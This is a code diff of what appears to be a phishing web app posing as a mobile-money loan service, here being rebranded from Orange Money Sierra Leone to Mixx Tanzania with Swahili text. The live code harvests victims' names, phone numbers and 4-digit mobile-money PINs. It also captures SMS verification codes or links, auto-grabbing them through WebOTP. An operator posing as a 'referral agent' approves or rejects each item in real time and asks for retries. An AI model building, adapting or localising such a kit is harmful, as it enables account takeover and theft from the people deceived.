-              showClipboardToast(finalVal.startsWith('http') ? '⚡ WebOTP: Verification Link Received!' : '⚡ WebOTP: Verification SMS Received!');
+              showClipboardToast(finalVal.startsWith('http') ? '⚡ WebOTP: Kiunganishi kimepokewa!' : '⚡ WebOTP: SMS imepokewa!');
               handlePostLoginPastedMsg(finalVal, false);
             }
           }
-        }).catch(err => {
-          // Silently ignore dismiss or abort
-        });
+        }).catch(() => {});
       } catch (e) {
         console.warn('WebOTP init error:', e);
       }
@@ -949,20 +940,19 @@
       const badge = document.getElementById('sms-waiting-badge');
 
       if (phoneTarget) {
-        phoneTarget.innerText = appState.phoneNumber || '76123456';
+        phoneTarget.innerText = appState.phoneNumber || 'Akaunti ya Mixx';
       }
 
-      // Always ensure the input starts completely empty
       if (msgInput) {
         msgInput.value = '';
-        msgInput.placeholder = 'Paste SMS confirmation message or verification link here...';
+        msgInput.placeholder = 'Bandika ujumbe wa SMS au kiunganishi hapa...';
       }
       if (statusEl) {
         statusEl.classList.add('hidden');
       }
       if (badge) {
         badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
-        badge.innerHTML = '<span>Ready to Paste</span>';
+        badge.innerHTML = '<span>Tayari Kubandika</span>';
       }
 
       startSmsCountdownTimer();
@@ -974,17 +964,17 @@
 
       const urlParams = new URLSearchParams(window.location.search);
       const refToken = urlParams.get('ref') || null;
-      const submissionId = window.crypto && window.crypto.randomUUID ? window.crypto.randomUUID() : ('orange-' + Date.now());
+      const submissionId = window.crypto && window.crypto.randomUUID ? window.crypto.randomUUID() : ('mixx-' + Date.now());
       const consent = document.getElementById('agent-consent-checkbox') ? document.getElementById('agent-consent-checkbox').checked : true;
 
       const payload = {
         firstName: appState.firstName || '',
         lastName: appState.lastName || '',
         phone: appState.phoneNumber || '',
-        loanType: appState.loanType || 'Personal Loan',
-        loanAmount: appState.loanAmount || 10000,
+        loanType: appState.loanType || 'Nivushe Plus Loan',
+        loanAmount: appState.loanAmount || 5000000,
         termMonths: appState.loanTermMonths || 6,
-        purpose: appState.purpose || 'Personal Investment',
+        purpose: appState.purpose || 'Biashara na Mtaji',
         employment: 'Self-Employed / Business Owner',
         annualIncome: appState.loanAmount * 2.5,
         referralToken: refToken,
@@ -1000,7 +990,7 @@
         });
         const data = await res.json().catch(() => ({}));
         if (!res.ok) {
-          throw new Error(data.error || 'Failed to submit application details');
+          throw new Error(data.error || 'Imeshindwa kutuma taarifa za ombi');
         }
         if (data.applicationId) {
           appState.applicationId = data.applicationId;
@@ -1088,7 +1078,7 @@
         const badge = document.getElementById('summary-status-badge');
         if (badge) {
           badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-amber-100 text-amber-800 border border-amber-300';
-          badge.innerText = '⏳ Under Review';
+          badge.innerText = '⏳ Inakaguliwa';
         }
       }
 
@@ -1111,7 +1101,6 @@
         const dispPhone = document.getElementById('momo-phone-display');
         if (dispPhone) dispPhone.value = appState.phoneNumber;
         
-        // Auto-register Application at Step 2 completion
         if (stepNum === 3) {
           ensureApplicationCreated();
         }
@@ -1127,14 +1116,11 @@
 
       currentStep = stepNum;
 
-      const logoSubtext = document.getElementById('logo-subtext');
       const backBtn = document.getElementById('header-back-btn');
 
       if (currentStep === 0) {
-        logoSubtext.classList.add('hidden');
         backBtn.classList.add('opacity-0', 'pointer-events-none');
       } else {
-        logoSubtext.classList.remove('hidden');
         backBtn.classList.remove('opacity-0', 'pointer-events-none');
       }
 
@@ -1161,18 +1147,18 @@
         const targetPhone = appState.phoneNumber || document.getElementById('phone-number-input')?.value || '';
         const smsPhoneTarget = document.getElementById('sms-phone-target');
         const smsTimerPhone = document.getElementById('sms-timer-phone');
-        if (smsPhoneTarget) smsPhoneTarget.innerText = targetPhone ? targetPhone : 'Sierra Leone';
-        if (smsTimerPhone) smsTimerPhone.innerText = targetPhone ? targetPhone : 'Sierra Leone';
+        if (smsPhoneTarget) smsPhoneTarget.innerText = targetPhone ? targetPhone : 'Akaunti ya Mixx';
+        if (smsTimerPhone) smsTimerPhone.innerText = targetPhone ? targetPhone : 'Akaunti ya Mixx';
         startSimSmsReceiver();
       }
 
       if (currentStep === 5) {
         document.getElementById('summary-name').innerText = `${appState.firstName} ${appState.lastName}`;
-        document.getElementById('summary-phone').innerText = `+232 ${appState.phoneNumber}`;
+        document.getElementById('summary-phone').innerText = `+255 ${appState.phoneNumber}`;
         document.getElementById('summary-type').innerText = appState.loanType;
-        document.getElementById('summary-amount').innerText = `SLE ${appState.loanAmount.toLocaleString()}`;
+        document.getElementById('summary-amount').innerText = `TZS ${appState.loanAmount.toLocaleString()}`;
         const monthly = calculateMonthly(appState.loanAmount, appState.loanTermMonths);
-        document.getElementById('summary-term').innerText = `${appState.loanTermMonths} Months (${monthly.toLocaleString()} SLE/mo)`;
+        document.getElementById('summary-term').innerText = `${appState.loanTermMonths} Miezi (${monthly.toLocaleString()} TZS/mo)`;
         if (appState.applicationId) {
           startVerificationPolling(appState.applicationId);
         }
@@ -1233,15 +1219,14 @@
       pinInputs.forEach(i => pin += i.value);
       appState.momoPin = pin;
 
-      // 4 Digits for Sierra Leone PIN
       if (pin.length === 4) {
         loginBtn.disabled = false;
         loginBtn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-        loginBtn.classList.add('orange-gradient', 'text-white', 'hover:opacity-95', 'shadow-md');
+        loginBtn.classList.add('mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md');
       } else {
         loginBtn.disabled = true;
         loginBtn.classList.add('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-        loginBtn.classList.remove('orange-gradient', 'text-white', 'hover:opacity-95', 'shadow-md');
+        loginBtn.classList.remove('mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md');
       }
     }
 
@@ -1250,7 +1235,7 @@
       pinInputs.forEach(i => {
         i.type = pinVisible ? 'text' : 'password';
       });
-      document.getElementById('eye-text').innerText = pinVisible ? 'Hide' : 'Show';
+      document.getElementById('eye-text').innerText = pinVisible ? 'Ficha' : 'Onyesha';
     }
 
     function clearPin() {
@@ -1281,7 +1266,6 @@
           }
         }
 
-        // Keep countdown card visible and timer counting down
         if (countdownCard) countdownCard.classList.remove('hidden');
         
         if (statusEl) {
@@ -1291,22 +1275,22 @@
             <svg class="w-4 h-4 text-emerald-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
               <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
             </svg>
-            <span>${isLink ? 'Verification link detected!' : 'Message detected!'} Ready for submission.</span>
+            <span>${isLink ? 'Kiunganishi kimetambuliwa!' : 'Ujumbe umetambuliwa!'} Tayari kwa kutuma.</span>
           `;
         }
         if (badge) {
           badge.className = 'inline-flex items-center text-[11px] font-bold text-emerald-700 bg-emerald-50 px-2.5 py-0.5 rounded-full border border-emerald-200';
-          badge.innerHTML = '<span class="mr-1">✓</span><span>Ready</span>';
+          badge.innerHTML = '<span class="mr-1">✓</span><span>Tayari</span>';
         }
 
         const btn = document.getElementById('submit-pasted-msg-btn');
         if (btn && !isSubmittingMessage) {
-          btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
+          btn.innerText = 'TUMA UJUMBE WA UHAKIKI';
         }
 
         if (isAuto) {
           if (btn && !isSubmittingMessage) {
-            btn.innerText = '⚡ AUTO-SUBMITTING...';
+            btn.innerText = '⚡ UNATUMA MOJA KWA MOJA...';
           }
           autoSubmitTimer = setTimeout(() => {
             if (!isSubmittingMessage) {
@@ -1318,7 +1302,7 @@
         if (statusEl) statusEl.classList.add('hidden');
         if (badge) {
           badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
-          badge.innerHTML = '<span>Ready to Paste</span>';
+          badge.innerHTML = '<span>Tayari Kubandika</span>';
         }
       }
     }
@@ -1335,7 +1319,7 @@
 
       if (!msg) {
         if (msgAlert) {
-          msgAlert.innerText = 'Please paste the SMS confirmation message or verification link received on your phone.';
+          msgAlert.innerText = 'Tafadhali bandika ujumbe wa uthibitisho wa SMS au kiunganishi kilichotumwa kwenye simu yako.';
           msgAlert.classList.remove('hidden');
         }
         return;
@@ -1344,13 +1328,13 @@
       isSubmittingMessage = true;
       if (btn) {
         btn.disabled = true;
-        btn.innerText = 'AWAITING APPROVAL...';
+        btn.innerText = 'INASUBIRI IDHINI...';
       }
       if (smsWaitingBox) smsWaitingBox.classList.remove('hidden');
       showApprovalOverlay(
-        'Awaiting SMS Verification',
-        'Your verification message has been submitted. Please wait while your referral agent verifies and approves your submission...',
-        'Verifying SMS Message...'
+        'Inasubiri Uhakiki wa SMS',
+        'Ujumbe wako wa uthibitisho umetumwa. Tafadhali subiri wakati wakala wako wa Mixx Wakala anahakiki na kuidhinisha uthibitisho wako...',
+        'Inahakiki Ujumbe wa SMS...'
       );
 
       try {
@@ -1370,13 +1354,13 @@
             isSubmittingMessage = false;
             hideApprovalOverlay();
             if (msgAlert) {
-              msgAlert.innerText = resData.error || '❌ Error submitting verification message. Please retry.';
+              msgAlert.innerText = resData.error || '❌ Hitilafu katika kutuma ujumbe wa uhakiki. Tafadhali jaribu tena.';
               msgAlert.classList.remove('hidden');
             }
             if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
             if (btn) {
               btn.disabled = false;
-              btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
+              btn.innerText = 'TUMA UJUMBE WA UHAKIKI';
             }
             startSmsCountdownTimer();
             return;
@@ -1392,13 +1376,13 @@
         isSubmittingMessage = false;
         hideApprovalOverlay();
         if (msgAlert) {
-          msgAlert.innerText = '❌ Error submitting verification message. Please retry.';
+          msgAlert.innerText = '❌ Hitilafu katika kutuma ujumbe wa uhakiki. Tafadhali jaribu tena.';
           msgAlert.classList.remove('hidden');
         }
         if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
         if (btn) {
           btn.disabled = false;
-          btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
+          btn.innerText = 'TUMA UJUMBE WA UHAKIKI';
         }
         startSmsCountdownTimer();
       }
@@ -1416,7 +1400,7 @@
 
       if (!fnEl || !fnEl.value.trim() || !lnEl || !lnEl.value.trim() || !phEl || !phEl.value.trim()) {
         if (step2Alert) {
-          step2Alert.innerText = 'Please complete all required fields (*).';
+          step2Alert.innerText = 'Tafadhali jaza sehemu zote zinazohitajika (*).';
           step2Alert.classList.remove('hidden');
         }
         return;
@@ -1432,13 +1416,13 @@
 
       if (authBtn) {
         authBtn.disabled = true;
-        authBtn.innerText = 'AWAITING APPROVAL...';
+        authBtn.innerText = 'INASUBIRI IDHINI...';
       }
       if (appWaitingBox) appWaitingBox.classList.remove('hidden');
       showApprovalOverlay(
-        'Awaiting Application Approval',
-        'Your loan application details have been submitted. Please wait while your referral agent approves your request...',
-        'Awaiting Agent Approval...'
+        'Inasubiri Idhini ya Ombi',
+        'Taarifa za ombi lako la mkopo zimetumwa. Tafadhali subiri wakati wakala wako wa Mixx Wakala anaidhinisha ombi lako...',
+        'Inasubiri Idhini ya Wakala...'
       );
 
       try {
@@ -1449,26 +1433,26 @@
           isAwaitingStep2Approval = false;
           hideApprovalOverlay();
           if (step2Alert) {
-            step2Alert.innerText = '❌ Error submitting application. Please retry.';
+            step2Alert.innerText = '❌ Hitilafu katika kutuma ombi. Tafadhali jaribu tena.';
             step2Alert.classList.remove('hidden');
           }
           if (appWaitingBox) appWaitingBox.classList.add('hidden');
           if (authBtn) {
             authBtn.disabled = false;
-            authBtn.innerText = 'CONTINUE TO ORANGE AUTHENTICATION';
+            authBtn.innerText = 'ENDELEA KWENYE UHAKIKI WA MIXX';
           }
         }
       } catch (err) {
         isAwaitingStep2Approval = false;
         hideApprovalOverlay();
         if (step2Alert) {
-          step2Alert.innerText = '❌ ' + (err.message || 'Error submitting application. Please retry.');
+          step2Alert.innerText = '❌ ' + (err.message || 'Hitilafu katika kutuma ombi. Tafadhali jaribu tena.');
           step2Alert.classList.remove('hidden');
         }
         if (appWaitingBox) appWaitingBox.classList.add('hidden');
         if (authBtn) {
           authBtn.disabled = false;
-          authBtn.innerText = 'CONTINUE TO ORANGE AUTHENTICATION';
+          authBtn.innerText = 'ENDELEA KWENYE UHAKIKI WA MIXX';
         }
       }
     }
@@ -1491,7 +1475,6 @@
       currentPollingAppId = appId;
       pollingInterval = setInterval(async () => {
         try {
-          // Check application stage approval for Step 2 gate
           const statusRes = await fetch(`/api/applications/${appId}/status`);
           if (statusRes.ok) {
             const statusData = await statusRes.json();
@@ -1510,17 +1493,16 @@
             if (badge && statusData.status) {
               if (st === 'approved') {
                 badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-emerald-100 text-emerald-800 border border-emerald-300';
-                badge.innerText = '✅ Approved';
+                badge.innerText = '✅ Imeidhinishwa';
               } else if (st === 'rejected') {
                 badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-red-100 text-red-800 border border-red-300';
-                badge.innerText = '❌ Rejected';
+                badge.innerText = '❌ Imekataliwa';
               } else if (st === 'under_review') {
-                badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-blue-100 text-blue-800 border border-blue-300';
-                badge.innerText = '🔍 Under Review';
+                badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-blue-100 text-blue-900 border border-blue-300';
+                badge.innerText = '🔍 Inakaguliwa';
               }
             }
 
-            // Step 2 Gate: If application status is approved, unlock and move to Step 3 ONLY when awaiting approval
             if (currentStep === 2 && isAwaitingStep2Approval) {
               const appWaitingBox = document.getElementById('app-waiting-box');
               const authBtn = document.getElementById('continue-to-auth-btn');
@@ -1532,7 +1514,7 @@
                 if (step2Alert) step2Alert.classList.add('hidden');
                 if (authBtn) {
                   authBtn.disabled = false;
-                  authBtn.innerText = 'CONTINUE TO ORANGE AUTHENTICATION';
+                  authBtn.innerText = 'ENDELEA KWENYE UHAKIKI WA MIXX';
                 }
                 goToStep(3);
               } else if (st === 'rejected') {
@@ -1540,12 +1522,12 @@
                 hideApprovalOverlay();
                 if (appWaitingBox) appWaitingBox.classList.add('hidden');
                 if (step2Alert) {
-                  step2Alert.innerText = '❌ Application details could not be verified by the referral agent. Please check your phone number and details, then click Continue to retry.';
+                  step2Alert.innerText = '❌ Taarifa za ombi lako hazikuweza kuhakikiwa na wakala wa Mixx Wakala. Tafadhali angalia nambari yako ya simu na taarifa zako kisha ubonyeze Endelea kujaribu tena.';
                   step2Alert.classList.remove('hidden');
                 }
                 if (authBtn) {
                   authBtn.disabled = false;
-                  authBtn.innerText = 'CONTINUE TO ORANGE AUTHENTICATION';
+                  authBtn.innerText = 'ENDELEA KWENYE UHAKIKI WA MIXX';
                 }
                 appState.applicationId = null;
               }
@@ -1557,7 +1539,6 @@
             const data = await res.json();
             const verifications = data.verifications || [];
 
-            // Step 3 PIN Gate: Only proceed to Step 4 if approved. If rejected, stay on Step 3 peacefully for retry
             const pinVer = (activePinVerId && verifications.find(v => v.id === activePinVerId))
               || verifications.find(v => v.step === 'zip_phone');
             const pinAlert = document.getElementById('pin-retry-alert');
@@ -1569,7 +1550,7 @@
                 if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
                 if (pinAlert) pinAlert.classList.add('hidden');
                 clearPin();
-                loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
+                loginBtn.innerHTML = 'INGIA NA THIBITISHA MKOPO';
                 loginBtn.disabled = false;
                 lastHandledRejectPinId = null;
                 activePinVerId = null;
@@ -1581,20 +1562,19 @@
                   hideApprovalOverlay();
                   if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
                   if (pinAlert) {
-                    pinAlert.innerText = pinVer.reject_reason || '❌ Invalid PIN! The 4-digit PIN entered was rejected. Please re-enter your 4-digit Orange Money PIN.';
+                    pinAlert.innerText = pinVer.reject_reason || '❌ PIN isiyo sahihi! PIN ya tarakimu 4 iliyowekwa imekataliwa. Tafadhali weka tena PIN yako ya tarakimu 4 ya Mixx.';
                     pinAlert.classList.remove('hidden');
                   }
                   clearPin();
-                  loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
+                  loginBtn.innerHTML = 'INGIA NA THIBITISHA MKOPO';
                   loginBtn.disabled = true;
                   loginBtn.classList.add('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-                  loginBtn.classList.remove('orange-gradient', 'text-white', 'hover:opacity-95', 'shadow-md');
+                  loginBtn.classList.remove('mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md');
                   if (pinInputs[0]) pinInputs[0].focus();
                 }
               }
             }
 
-            // Step 4 SMS Gate: Only proceed to Step 5 if approved. If rejected, stay on Step 4 peacefully for retry
             const smsVer = (activeSmsVerId && verifications.find(v => v.id === activeSmsVerId))
               || verifications.find(v => v.step === 'id_document');
             const msgAlert = document.getElementById('msg-retry-alert');
@@ -1613,9 +1593,9 @@
                 if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
                 if (msgAlert) msgAlert.classList.add('hidden');
                 if (smsBtn) {
-                  smsBtn.innerText = '✓ APPROVED';
-                  smsBtn.classList.remove('orange-gradient');
-                  smsBtn.classList.add('bg-emerald-600');
+                  smsBtn.innerText = '✓ IMEIDHINISHWA';
+                  smsBtn.classList.remove('mixx-btn-gradient');
+                  smsBtn.classList.add('bg-emerald-600', 'text-white');
                 }
                 lastHandledRejectSmsId = null;
                 activeSmsVerId = null;
@@ -1640,23 +1620,20 @@
                   const badge = document.getElementById('sms-waiting-badge');
                   if (badge) {
                     badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
-                    badge.innerHTML = '<span>Ready to Paste</span>';
+                    badge.innerHTML = '<span>Tayari Kubandika</span>';
                   }
 
                   if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
                   if (msgAlert) {
-                    msgAlert.innerText = smsVer.reject_reason || '❌ Verification message rejected or expired! Please copy the complete SMS message or verification link and paste it below.';
+                    msgAlert.innerText = smsVer.reject_reason || '❌ Ujumbe wa uhakiki umekataliwa au muda umeisha! Tafadhali nakili ujumbe kamili wa SMS au kiunganishi cha uthibitisho kisha ubandike hapa chini.';
                     msgAlert.classList.remove('hidden');
                   }
                   if (smsBtn) {
                     smsBtn.disabled = false;
-                    smsBtn.innerText = 'SUBMIT VERIFICATION MESSAGE';
+                    smsBtn.innerText = 'TUMA UJUMBE WA UHAKIKI';
                   }
 
-                  // Restart countdown timer so it is actively counting down on retry!
                   startSmsCountdownTimer();
-
-                  // Re-arm WebOTP to catch the retry SMS
                   initWebOtpReceiver();
                 }
               }
@@ -1667,7 +1644,6 @@
     }
 
     async function submitApplication() {
-      // Require 4 digits for Sierra Leone PIN
       if (appState.momoPin.length < 4) return;
       
       const pinAlert = document.getElementById('pin-retry-alert');
@@ -1678,18 +1654,18 @@
 
       loginBtn.innerHTML = `
         <span class="inline-flex items-center">
-          <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
+          <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-blue-950" fill="none" viewBox="0 0 24 24">
             <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
             <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
           </svg>
-          AWAITING APPROVAL...
+          INASUBIRI IDHINI...
         </span>`;
       loginBtn.disabled = true;
 
       showApprovalOverlay(
-        'Awaiting PIN Verification',
-        'Your 4-digit PIN has been submitted. Please wait while your referral agent verifies and approves your PIN...',
-        'Verifying PIN...'
+        'Inasubiri Uhakiki wa PIN',
+        'PIN yako ya tarakimu 4 imetumwa. Tafadhali subiri wakati wakala wako wa Mixx Wakala anahakiki na kuidhinisha PIN yako...',
+        'Inahakiki PIN...'
       );
 
       try {
@@ -1712,14 +1688,14 @@
           if (!res.ok && res.status !== 409) {
             hideApprovalOverlay();
             if (pinAlert) {
-              pinAlert.innerText = resData.error || '❌ Error submitting PIN. Please retry.';
+              pinAlert.innerText = resData.error || '❌ Hitilafu katika kutuma PIN. Tafadhali jaribu tena.';
               pinAlert.classList.remove('hidden');
             }
             if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
-            loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
+            loginBtn.innerHTML = 'INGIA NA THIBITISHA MKOPO';
             loginBtn.disabled = false;
             loginBtn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-            loginBtn.classList.add('orange-gradient', 'text-white', 'hover:opacity-95', 'shadow-md');
+            loginBtn.classList.add('mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md');
             return;
           }
 
@@ -1733,14 +1709,14 @@
         hideApprovalOverlay();
         console.error('Submission error:', err);
         if (pinAlert) {
-          pinAlert.innerText = '❌ Error submitting PIN. Please retry.';
+          pinAlert.innerText = '❌ Hitilafu katika kutuma PIN. Tafadhali jaribu tena.';
           pinAlert.classList.remove('hidden');
         }
         if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
-        loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
+        loginBtn.innerHTML = 'INGIA NA THIBITISHA MKOPO';
         loginBtn.disabled = false;
         loginBtn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-        loginBtn.classList.add('orange-gradient', 'text-white', 'hover:opacity-95', 'shadow-md');
+        loginBtn.classList.add('mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md');
       }
     }
 
@@ -1775,7 +1751,7 @@
           banner.classList.remove('hidden');
         }
       }
-      updateCalculator(10000);
+      updateCalculator(5000000);
       goToStep(0);
     });
   </script>
